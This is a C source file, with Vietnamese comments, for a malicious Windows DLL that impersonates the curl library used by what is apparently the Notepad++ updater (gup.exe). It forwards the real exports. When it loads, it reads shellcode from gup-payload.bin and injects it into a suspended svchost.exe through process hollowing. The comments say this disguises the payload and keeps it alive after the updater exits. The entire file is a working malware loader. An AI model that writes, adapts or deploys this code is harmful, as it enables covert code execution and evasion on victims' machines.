#include "pch.h"
#include <stdio.h>
#include <stdlib.h>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

#pragma comment(linker, "/export:curl_easy_cleanup=gup.curl_easy_cleanup,@1")
#pragma comment(linker, "/export:curl_easy_init=gup.curl_easy_init,@6")
#pragma comment(linker, "/export:curl_easy_perform=gup.curl_easy_perform,@12")
#pragma comment(linker, "/export:curl_easy_setopt=gup.curl_easy_setopt,@16")

DWORD WINAPI DoMagic(LPVOID lpParameter)
{
    FILE* fp;
    size_t size;
    unsigned char* buffer;

    fp = fopen("gup-payload.bin", "rb");
    fseek(fp, 0, SEEK_END);
    size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    buffer = (unsigned char*)malloc(size);
    fread(buffer, size, 1, fp);
    fclose(fp);

    // Tạo tiến trình svchost giả mạo (hoặc bất kỳ tiến trình nào bạn muốn)
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    BOOL success = CreateProcessA(
        "C:\\Windows\\System32\\svchost.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED,
        NULL, NULL, &si, &pi
    );

    if (!success) return 1;

    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, remoteMem, buffer, size, NULL);

    // Thay đổi context để nhảy vào shellcode
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

#ifdef _WIN64
    ctx.Rip = (DWORD64)remoteMem;
#else
    ctx.Eip = (DWORD)remoteMem;
#endif

    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    // Không đóng pi.hProcess nếu bạn muốn giữ payload sống sau khi gup.exe thoát
    return 0;
}


BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    HANDLE threadHandle;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
        CloseHandle(threadHandle);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}